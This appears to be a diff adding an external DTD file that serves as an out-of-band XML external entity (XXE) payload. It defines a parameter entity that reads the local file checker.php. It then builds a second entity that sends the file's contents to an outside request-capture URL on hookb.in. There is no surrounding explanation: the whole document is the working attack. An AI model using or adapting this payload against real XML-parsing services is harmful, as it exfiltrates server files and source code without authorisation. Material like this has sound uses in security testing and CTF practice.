@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file://checker.php">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://hookb.in/gge1JJ37BYTlL30dV3g6/?salut=%file;'>">
+
+%eval;
+%error;
